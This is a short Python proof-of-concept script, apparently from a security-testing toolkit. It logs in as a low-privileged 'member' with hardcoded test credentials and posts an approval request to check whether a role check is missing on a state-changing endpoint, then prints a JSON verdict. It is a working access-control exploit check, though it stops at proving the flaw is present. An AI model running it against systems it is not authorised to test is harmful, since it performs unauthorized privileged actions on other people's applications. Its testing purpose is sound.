#!/usr/bin/python3
"""Find the flaw the scanner never reported, then prove it like the rest.

Automated tools do not know who is allowed to do what, so a missing role
check on a state-changing action is invisible to them. A low-privileged
member performs an action reserved for another role: that is the proof.
Presence, never impact.
"""
import argparse
import json
import sys

import urllib.error
import urllib.parse
import urllib.request

try:
    import requests
except ImportError:  # the lab box may not ship it
    requests = None

ACTIONS = "/api/v1/team/actions"
APPROVE = "/api/v1/team/actions/approve"
MEMBER = "test-user-a"
PASSWORD = "HalcyonTestA!"


def member_session(base):
    """A member session: members are the ones who are not approvers."""
    if requests is None:
        return None
    session = requests.Session()
    session.post(
        base + "/login",
        data={"username": MEMBER, "password": PASSWORD},
        timeout=8,
        allow_redirects=False,
    )
    return session


def ask(session, url, method="GET", payload=None):
    if requests is not None and session is not None:
        try:
            response = session.request(method, url, json=payload, timeout=8)
            return response.status_code, response.text
        except Exception as exc:
            return None, str(exc)
    data = None
    request = urllib.request.Request(url, method=method)
    if payload is not None:
        data = json.dumps(payload).encode()
        request.add_header("Content-Type", "application/json")
        request.data = data
    try:
        with urllib.request.urlopen(request, timeout=8) as response:
            return response.status, response.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode("utf-8", "replace")
    except (urllib.error.URLError, TimeoutError, OSError) as exc:
        return None, str(exc)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", required=True)
    args = parser.parse_args()
    base = args.target.rstrip("/")

    session = member_session(base)
    listing_status, listing = ask(session, base + ACTIONS)
    approve_status, approve_body = ask(
        session, base + APPROVE, "POST", {"action": "approve", "id": 1041}
    )

    evidence = {
        "flaw": "role check missing on a state-changing action",
        "as_principal": MEMBER,
        "actions_listed": listing_status,
        "approve_status": approve_status,
    }
    verdict = "unconfirmed"
    if approve_status is None:
        evidence["error"] = approve_body
    elif approve_status in (200, 201, 204):
        verdict = "confirmed"
        evidence["proof"] = (
            "member performed an approval reserved for "
            "another role, in two requests"
        )
    elif approve_status in (401, 403):
        verdict = "false_positive"
        evidence["proof"] = "approval refused for a member"

    emit = {
        "finding": "DISCOVERED-001",
        "class": "business_logic_access_control",
        "verdict": verdict,
        "evidence": evidence,
        "stopped_at": "flaw proven present; impact not demonstrated",
    }
    if verdict == "unconfirmed":
        emit["to_settle"] = (
            "the approval action did not answer for a " "member account"
        )
    print(json.dumps(emit, indent=2))


if __name__ == "__main__":
    main()
